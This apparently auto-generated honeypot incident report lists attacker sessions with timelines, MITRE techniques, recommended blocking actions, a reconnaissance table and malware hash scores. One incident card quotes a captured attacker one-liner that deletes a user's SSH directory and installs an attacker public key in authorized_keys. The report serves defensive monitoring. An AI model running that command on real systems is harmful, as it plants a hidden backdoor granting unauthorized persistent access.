| `2026-07-17 08:27:58` | `cowrie.session.connect` |
| `2026-07-17 08:27:59` | `cowrie.client.version` |
| `2026-07-17 08:27:59` | `cowrie.client.kex` |
| `2026-07-17 08:28:00` | `cowrie.login.success` |
| `2026-07-17 08:28:01` | `cowrie.direct-tcpip.request` |
| `2026-07-17 08:28:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `200.37.179[.]83` to AbuseIPDB if not already reported
- [ ] Block `200.37.179[.]83` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cc628e74f1d4

| Field | Detail |
|---|---|
| **Source IP** | `45.178.227[.]0` |
| **First Seen** | 2026-07-17 08:28 |
| **Last Seen** | 2026-07-17 08:28 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 08:28:06` | `cowrie.session.connect` |
| `2026-07-17 08:28:06` | `cowrie.client.version` |
| `2026-07-17 08:28:06` | `cowrie.client.kex` |
| `2026-07-17 08:28:07` | `cowrie.login.success` |
| `2026-07-17 08:28:08` | `cowrie.direct-tcpip.request` |
| `2026-07-17 08:28:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.178.227[.]0` to AbuseIPDB if not already reported
- [ ] Block `45.178.227[.]0` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-730443ff3d21

| Field | Detail |
|---|---|
| **Source IP** | `111.70.23[.]245` |
| **First Seen** | 2026-07-17 08:30 |
| **Last Seen** | 2026-07-17 08:31 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 08:30:59` | `cowrie.session.connect` |
| `2026-07-17 08:31:00` | `cowrie.client.version` |
| `2026-07-17 08:31:00` | `cowrie.client.kex` |
| `2026-07-17 08:31:03` | `cowrie.login.success` |
| `2026-07-17 08:31:03` | `cowrie.direct-tcpip.request` |
| `2026-07-17 08:31:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.70.23[.]245` to AbuseIPDB if not already reported
- [ ] Block `111.70.23[.]245` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4b86d7ce6c01

| Field | Detail |
|---|---|
| **Source IP** | `60.191.58[.]203` |
| **First Seen** | 2026-07-17 08:31 |
| **Last Seen** | 2026-07-17 08:31 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 08:31:11` | `cowrie.session.connect` |
| `2026-07-17 08:31:12` | `cowrie.client.version` |
| `2026-07-17 08:31:12` | `cowrie.client.kex` |
| `2026-07-17 08:31:14` | `cowrie.login.success` |
| `2026-07-17 08:31:15` | `cowrie.direct-tcpip.request` |
| `2026-07-17 08:31:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `60.191.58[.]203` to AbuseIPDB if not already reported
- [ ] Block `60.191.58[.]203` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-658f3305e8f1

| Field | Detail |
|---|---|
| **Source IP** | `119.200.229[.]33` |
| **First Seen** | 2026-07-17 08:34 |
| **Last Seen** | 2026-07-17 08:34 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 08:34:27` | `cowrie.session.connect` |
| `2026-07-17 08:34:28` | `cowrie.client.version` |
| `2026-07-17 08:34:28` | `cowrie.client.kex` |
| `2026-07-17 08:34:29` | `cowrie.login.success` |
| `2026-07-17 08:34:30` | `cowrie.direct-tcpip.request` |
| `2026-07-17 08:34:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `119.200.229[.]33` to AbuseIPDB if not already reported
- [ ] Block `119.200.229[.]33` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b0962313a528

| Field | Detail |
|---|---|
| **Source IP** | `213.230.64[.]246` |
| **First Seen** | 2026-07-17 08:34 |
| **Last Seen** | 2026-07-17 08:34 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 08:34:40` | `cowrie.session.connect` |
| `2026-07-17 08:34:40` | `cowrie.client.version` |
| `2026-07-17 08:34:40` | `cowrie.client.kex` |
| `2026-07-17 08:34:42` | `cowrie.login.success` |
| `2026-07-17 08:34:42` | `cowrie.direct-tcpip.request` |
| `2026-07-17 08:34:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.230.64[.]246` to AbuseIPDB if not already reported
- [ ] Block `213.230.64[.]246` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8cb731876bdc

| Field | Detail |
|---|---|
| **Source IP** | `194.195.210[.]47` |
| **First Seen** | 2026-07-17 08:37 |
| **Last Seen** | 2026-07-17 08:37 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `Accept: */*, Accept-Encoding: gzip, User-Agent: Mozilla/5.0 zgrab/0.x` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 08:37:01` | `cowrie.session.connect` |
| `2026-07-17 08:37:01` | `cowrie.login.success` |
| `2026-07-17 08:37:01` | `cowrie.session.params` |
| `2026-07-17 08:37:01` | `cowrie.command.input` |
| `2026-07-17 08:37:01` | `cowrie.command.failed` |
| `2026-07-17 08:37:01` | `cowrie.command.input` |
| `2026-07-17 08:37:01` | `cowrie.command.failed` |
| `2026-07-17 08:37:01` | `cowrie.command.input` |
| `2026-07-17 08:37:01` | `cowrie.command.failed` |
| `2026-07-17 08:37:01` | `cowrie.command.input` |
| `2026-07-17 08:37:06` | `cowrie.log.closed` |
| `2026-07-17 08:37:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `194.195.210[.]47` to AbuseIPDB if not already reported
- [ ] Block `194.195.210[.]47` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-48f60a84ba08

| Field | Detail |
|---|---|
| **Source IP** | `45.33.80[.]243` |
| **First Seen** | 2026-07-17 08:38 |
| **Last Seen** | 2026-07-17 08:38 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0[.]0 Safari/537.36, Accept: */*, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 08:38:48` | `cowrie.session.connect` |
| `2026-07-17 08:38:48` | `cowrie.login.success` |
| `2026-07-17 08:38:48` | `cowrie.session.params` |
| `2026-07-17 08:38:48` | `cowrie.command.input` |
| `2026-07-17 08:38:48` | `cowrie.command.input` |
| `2026-07-17 08:38:48` | `cowrie.command.failed` |
| `2026-07-17 08:38:48` | `cowrie.command.input` |
| `2026-07-17 08:38:48` | `cowrie.command.failed` |
| `2026-07-17 08:38:48` | `cowrie.command.input` |
| `2026-07-17 08:38:48` | `cowrie.log.closed` |
| `2026-07-17 08:38:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.33.80[.]243` to AbuseIPDB if not already reported
- [ ] Block `45.33.80[.]243` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-42d8548008c7

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-17 08:44 |
| **Last Seen** | 2026-07-17 08:44 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 08:44:21` | `cowrie.session.connect` |
| `2026-07-17 08:44:22` | `cowrie.client.version` |
| `2026-07-17 08:44:22` | `cowrie.client.kex` |
| `2026-07-17 08:44:24` | `cowrie.login.success` |
| `2026-07-17 08:44:25` | `cowrie.session.params` |
| `2026-07-17 08:44:25` | `cowrie.command.input` |
| `2026-07-17 08:44:25` | `cowrie.log.closed` |
| `2026-07-17 08:44:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-576e6d35d556

| Field | Detail |
|---|---|
| **Source IP** | `103.59.163[.]132` |
| **First Seen** | 2026-07-17 08:47 |
| **Last Seen** | 2026-07-17 08:47 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 08:47:12` | `cowrie.session.connect` |
| `2026-07-17 08:47:12` | `cowrie.client.version` |
| `2026-07-17 08:47:13` | `cowrie.client.kex` |
| `2026-07-17 08:47:14` | `cowrie.login.success` |
| `2026-07-17 08:47:15` | `cowrie.session.params` |
| `2026-07-17 08:47:15` | `cowrie.command.input` |
| `2026-07-17 08:47:15` | `cowrie.command.failed` |
| `2026-07-17 08:47:16` | `cowrie.log.closed` |
| `2026-07-17 08:47:16` | `cowrie.session.params` |
| `2026-07-17 08:47:16` | `cowrie.command.input` |
| `2026-07-17 08:47:17` | `cowrie.session.file_download` |
| `2026-07-17 08:47:17` | `cowrie.log.closed` |
| `2026-07-17 08:47:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.59.163[.]132` to AbuseIPDB if not already reported
- [ ] Block `103.59.163[.]132` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1a29c7a984de

| Field | Detail |
|---|---|
| **Source IP** | `103.59.163[.]132` |
| **First Seen** | 2026-07-17 08:47 |
| **Last Seen** | 2026-07-17 08:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 08:47:17` | `cowrie.session.connect` |
| `2026-07-17 08:47:17` | `cowrie.client.version` |
| `2026-07-17 08:47:17` | `cowrie.client.kex` |
| `2026-07-17 08:47:18` | `cowrie.login.success` |
| `2026-07-17 08:47:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.59.163[.]132` to AbuseIPDB if not already reported
- [ ] Block `103.59.163[.]132` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c7e840ed3dab

| Field | Detail |
|---|---|
| **Source IP** | `103.59.163[.]135` |
| **First Seen** | 2026-07-17 08:47 |
| **Last Seen** | 2026-07-17 08:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 08:47:19` | `cowrie.session.connect` |
| `2026-07-17 08:47:19` | `cowrie.client.version` |
| `2026-07-17 08:47:19` | `cowrie.client.kex` |
| `2026-07-17 08:47:20` | `cowrie.login.success` |
| `2026-07-17 08:47:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.59.163[.]135` to AbuseIPDB if not already reported
- [ ] Block `103.59.163[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e8d5c5e4d716

| Field | Detail |
|---|---|
| **Source IP** | `183.6.118[.]248` |
| **First Seen** | 2026-07-17 08:50 |
| **Last Seen** | 2026-07-17 08:50 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 08:50:30` | `cowrie.session.connect` |
| `2026-07-17 08:50:31` | `cowrie.client.version` |
| `2026-07-17 08:50:31` | `cowrie.client.kex` |
| `2026-07-17 08:50:34` | `cowrie.login.success` |
| `2026-07-17 08:50:35` | `cowrie.direct-tcpip.request` |
| `2026-07-17 08:50:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.6.118[.]248` to AbuseIPDB if not already reported
- [ ] Block `183.6.118[.]248` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2fe31d057c2f

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-17 08:51 |
| **Last Seen** | 2026-07-17 08:51 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 08:51:32` | `cowrie.session.connect` |
| `2026-07-17 08:51:32` | `cowrie.client.version` |
| `2026-07-17 08:51:32` | `cowrie.client.kex` |
| `2026-07-17 08:51:32` | `cowrie.login.success` |
| `2026-07-17 08:51:32` | `cowrie.direct-tcpip.request` |
| `2026-07-17 08:51:32` | `cowrie.direct-tcpip.data` |
| `2026-07-17 08:51:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4bb2a19e473a

| Field | Detail |
|---|---|
| **Source IP** | `182.156.35[.]238` |
| **First Seen** | 2026-07-17 08:52 |
| **Last Seen** | 2026-07-17 08:52 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 08:52:38` | `cowrie.session.connect` |
| `2026-07-17 08:52:39` | `cowrie.client.version` |
| `2026-07-17 08:52:39` | `cowrie.client.kex` |
| `2026-07-17 08:52:41` | `cowrie.login.success` |
| `2026-07-17 08:52:41` | `cowrie.direct-tcpip.request` |
| `2026-07-17 08:52:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.156.35[.]238` to AbuseIPDB if not already reported
- [ ] Block `182.156.35[.]238` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-619ffadb6500

| Field | Detail |
|---|---|
| **Source IP** | `103.158.138[.]179` |
| **First Seen** | 2026-07-17 08:52 |
| **Last Seen** | 2026-07-17 08:52 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 08:52:51` | `cowrie.session.connect` |
| `2026-07-17 08:52:52` | `cowrie.client.version` |
| `2026-07-17 08:52:52` | `cowrie.client.kex` |
| `2026-07-17 08:52:53` | `cowrie.login.success` |
| `2026-07-17 08:52:54` | `cowrie.direct-tcpip.request` |
| `2026-07-17 08:52:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.158.138[.]179` to AbuseIPDB if not already reported
- [ ] Block `103.158.138[.]179` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1996e7a3d498

| Field | Detail |
|---|---|
| **Source IP** | `219.128.15[.]190` |
| **First Seen** | 2026-07-17 08:53 |
| **Last Seen** | 2026-07-17 08:53 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 08:53:38` | `cowrie.session.connect` |
| `2026-07-17 08:53:39` | `cowrie.client.version` |
| `2026-07-17 08:53:39` | `cowrie.client.kex` |
| `2026-07-17 08:53:43` | `cowrie.login.success` |
| `2026-07-17 08:53:45` | `cowrie.direct-tcpip.request` |
| `2026-07-17 08:53:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `219.128.15[.]190` to AbuseIPDB if not already reported
- [ ] Block `219.128.15[.]190` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-76b50e590b2d

| Field | Detail |
|---|---|
| **Source IP** | `68.225.58[.]59` |
| **First Seen** | 2026-07-17 08:53 |
| **Last Seen** | 2026-07-17 08:53 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 08:53:52` | `cowrie.session.connect` |
| `2026-07-17 08:53:53` | `cowrie.client.version` |
| `2026-07-17 08:53:53` | `cowrie.client.kex` |
| `2026-07-17 08:53:54` | `cowrie.login.success` |
| `2026-07-17 08:53:55` | `cowrie.direct-tcpip.request` |
| `2026-07-17 08:53:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `68.225.58[.]59` to AbuseIPDB if not already reported
- [ ] Block `68.225.58[.]59` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `161.35.8[.]0` | **92** | 2026-07-17 05:00 | 2026-07-17 08:53 | 57m | 0 | `T1592` | 🟠 MEDIUM |
| `34.78.255[.]113` | **10** | 2026-07-17 05:06 | 2026-07-17 05:07 | 0m | 0 | `T1592` | 🟠 MEDIUM |
| `64.89.162[.]15` | **5** | 2026-07-17 08:01 | 2026-07-17 08:37 | 0m | 0 | `T1592` | 🟢 LOW |
| `194.165.16[.]164` | **3** | 2026-07-17 08:27 | 2026-07-17 08:27 | 0m | 0 | `T1592` | 🟢 LOW |
| `194.165.16[.]165` | **3** | 2026-07-17 06:28 | 2026-07-17 06:28 | 0m | 0 | `T1592` | 🟢 LOW |
| `194.165.16[.]166` | **3** | 2026-07-17 07:01 | 2026-07-17 07:01 | 0m | 0 | `T1592` | 🟢 LOW |
| `199.45.154[.]113` | **3** | 2026-07-17 06:40 | 2026-07-17 06:41 | 0m | 0 | `T1592` | 🟢 LOW |
| `45.227.254[.]156` | **3** | 2026-07-17 08:48 | 2026-07-17 08:48 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.186[.]161` | **3** | 2026-07-17 07:54 | 2026-07-17 07:54 | 0m | 0 | `T1592` | 🟢 LOW |
| `88.214.25[.]124` | **3** | 2026-07-17 05:43 | 2026-07-17 05:43 | 0m | 0 | `T1592` | 🟢 LOW |
| `88.214.25[.]125` | **3** | 2026-07-17 07:29 | 2026-07-17 07:29 | 0m | 0 | `T1592` | 🟢 LOW |
| `1.180.246[.]242` | **2** | 2026-07-17 08:43 | 2026-07-17 08:45 | 2m | 0 | `T1592` | 🟢 LOW |
| `120.48.21[.]145` | **2** | 2026-07-17 08:04 | 2026-07-17 08:06 | 2m | 0 | `T1592` | 🟢 LOW |
| `14.103.120[.]75` | **2** | 2026-07-17 07:22 | 2026-07-17 07:24 | 4m | 0 | `T1592` | 🟢 LOW |
| `18.116.101[.]220` | **2** | 2026-07-17 08:02 | 2026-07-17 08:05 | 0m | 0 | `T1592` | 🟢 LOW |
| `195.178.110[.]137` | **2** | 2026-07-17 07:32 | 2026-07-17 07:36 | 0m | 0 | `T1592` | 🟢 LOW |
| `2.57.122[.]168` | **2** | 2026-07-17 06:35 | 2026-07-17 07:05 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `45.79.115[.]59` | **2** | 2026-07-17 07:38 | 2026-07-17 08:36 | 0m | 0 | `T1592` | 🟢 LOW |
| `45.79.181[.]223` | **2** | 2026-07-17 07:10 | 2026-07-17 07:10 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]177` | **2** | 2026-07-17 07:54 | 2026-07-17 07:54 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.186[.]170` | **2** | 2026-07-17 08:24 | 2026-07-17 08:24 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]101` | **2** | 2026-07-17 05:17 | 2026-07-17 05:17 | 0m | 0 | `T1592` | 🟢 LOW |
| `101.36.228[.]201` | 1 | 2026-07-17 06:02 | 2026-07-17 06:04 | 120s | 0 | `T1592` | 🟢 LOW |
| `106.12.154[.]140` | 1 | 2026-07-17 08:22 | 2026-07-17 08:24 | 120s | 0 | `T1592` | 🟢 LOW |
| `106.13.114[.]161` | 1 | 2026-07-17 05:25 | 2026-07-17 05:27 | 120s | 0 | `T1592` | 🟢 LOW |
| `115.191.64[.]182` | 1 | 2026-07-17 05:28 | 2026-07-17 05:30 | 120s | 0 | `T1592` | 🟢 LOW |
| `117.69.255[.]239` | 1 | 2026-07-17 05:39 | 2026-07-17 05:39 | 7s | 0 | `T1592` | 🟢 LOW |
| `121.229.25[.]10` | 1 | 2026-07-17 05:24 | 2026-07-17 05:26 | 120s | 0 | `T1592` | 🟢 LOW |
| `134.122.78[.]248` | 1 | 2026-07-17 06:52 | 2026-07-17 06:52 | 30s | 0 | `T1592` | 🟢 LOW |
| `156.226.175[.]58` | 1 | 2026-07-17 06:49 | 2026-07-17 06:49 | 0s | 0 | `T1592` | 🟢 LOW |
| `172.235.41[.]245` | 1 | 2026-07-17 08:23 | 2026-07-17 08:23 | 0s | 0 | `T1592` | 🟢 LOW |
| `180.184.178[.]165` | 1 | 2026-07-17 07:19 | 2026-07-17 07:21 | 120s | 0 | `T1592` | 🟢 LOW |
| `185.216.145[.]162` | 1 | 2026-07-17 06:24 | 2026-07-17 06:24 | 0s | 0 | `T1592` | 🟢 LOW |
| `185.223.235[.]16` | 1 | 2026-07-17 06:24 | 2026-07-17 06:25 | 10s | 0 | `T1592` | 🟢 LOW |
| `185.226.197[.]15` | 1 | 2026-07-17 07:30 | 2026-07-17 07:30 | 8s | 0 | `T1592` | 🟢 LOW |
| `220.189.209[.]18` | 1 | 2026-07-17 05:36 | 2026-07-17 05:36 | 2s | 0 | `T1592` | 🟢 LOW |
| `223.166.28[.]162` | 1 | 2026-07-17 05:04 | 2026-07-17 05:04 | 0s | 0 | `T1592` | 🟢 LOW |
| `223.221.36[.]42` | 1 | 2026-07-17 05:28 | 2026-07-17 05:30 | 120s | 0 | `T1592` | 🟢 LOW |
| `35.205.107[.]195` | 1 | 2026-07-17 05:06 | 2026-07-17 05:06 | 3s | 0 | `T1592` | 🟢 LOW |
| `36.24.175[.]34` | 1 | 2026-07-17 07:56 | 2026-07-17 07:56 | 13s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]141` | 1 | 2026-07-17 07:08 | 2026-07-17 07:08 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.33.80[.]243` | 1 | 2026-07-17 08:38 | 2026-07-17 08:38 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.63.4[.]69` | 1 | 2026-07-17 07:22 | 2026-07-17 07:22 | 1s | 0 | `T1592` | 🟢 LOW |
| `59.98.41[.]27` | 1 | 2026-07-17 06:26 | 2026-07-17 06:26 | 5s | 0 | `T1592` | 🟢 LOW |
| `70.166.167[.]35` | 1 | 2026-07-17 04:59 | 2026-07-17 05:01 | 120s | 0 | `T1592` | 🟢 LOW |
| `70.166.167[.]35` | 1 | 2026-07-17 07:37 | 2026-07-17 07:39 | 120s | 0 | `T1592` | 🟢 LOW |
| `70.166.167[.]58` | 1 | 2026-07-17 07:28 | 2026-07-17 07:30 | 120s | 0 | `T1592` | 🟢 LOW |
| `91.230.168[.]123` | 1 | 2026-07-17 08:03 | 2026-07-17 08:03 | 0s | 0 | `T1592` | 🟢 LOW |
| `91.230.168[.]125` | 1 | 2026-07-17 08:03 | 2026-07-17 08:03 | 2s | 0 | `T1592` | 🟢 LOW |
| `91.230.168[.]252` | 1 | 2026-07-17 08:03 | 2026-07-17 08:03 | 10s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 63/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/74 ✅ |
